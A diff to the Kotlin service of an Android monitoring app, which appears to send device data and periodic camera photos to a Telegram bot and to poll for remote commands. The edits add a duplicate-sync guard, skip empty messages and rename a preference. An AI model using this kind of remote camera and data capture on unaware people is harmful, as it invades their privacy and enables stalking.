@@ -40,6 +40,7 @@ class MonitoringService : Service() {
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
+    private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -159,16 +160,26 @@ class MonitoringService : Service() {
         }
         android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
 
-        // Send initial data only once per device (never re-dump history on reboot)
-        if (!preferencesManager.initialSyncDone) {
-            serviceScope.launch {
-                android.util.Log.i("MonitoringService", "Starting initial data collection...")
-                sendInitialData()
-                android.util.Log.i("MonitoringService", "Initial data collection completed")
+        serviceScope.launch {
+            try {
+                if (!preferencesManager.initialSyncDone && initialSyncStarted.compareAndSet(false, true)) {
+                    android.util.Log.i("MonitoringService", "Starting initial data collection...")
+                    sendInitialData()
+                    android.util.Log.i("MonitoringService", "Initial data collection completed")
+                }
+            } catch (_: Exception) {
             }
+            startPeriodicLoops()
         }
+        android.util.Log.d("MonitoringService", "Monitoring loop started")
+        android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
+        startCommandPolling()
+        serviceScope.launch {
+            registerBotCommands()
+        }
+    }
 
-        // Start periodic monitoring (honors the user-configured interval)
+    private fun startPeriodicLoops() {
         monitoringJob = serviceScope.launch {
             while (isActive) {
                 try {
@@ -181,9 +192,6 @@ class MonitoringService : Service() {
                 }
             }
         }
-        android.util.Log.d("MonitoringService", "Monitoring loop started")
-        
-        // Start camera monitoring (user-configured interval)
         cameraJob = serviceScope.launch {
             while (isActive) {
                 try {
@@ -195,11 +203,6 @@ class MonitoringService : Service() {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
                 }
             }
-        }
-        android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
-        startCommandPolling()
-        serviceScope.launch {
-            registerBotCommands()
         }
     }
 
@@ -824,8 +827,10 @@ class MonitoringService : Service() {
                 rest = rest.drop(4000)
             }
             if (current.length + rest.length + 1 > 4000) {
-                sendToTelegram(current.toString())
-                delay(1000)
+                if (current.isNotEmpty()) {
+                    sendToTelegram(current.toString())
+                    delay(1000)
+                }
                 current = StringBuilder()
             }
             if (current.isNotEmpty()) current.append("\n")
@@ -1021,8 +1026,8 @@ class MonitoringService : Service() {
     private suspend fun notifyPhotoSendFailure(detail: String) {
         try {
             val now = System.currentTimeMillis()
-            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
-            preferencesManager.lastCameraErrorNotice = now
+            if (now - preferencesManager.lastUploadErrorNotice < 30 * 60_000L) return
+            preferencesManager.lastUploadErrorNotice = now
             sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error sending upload notice", e)
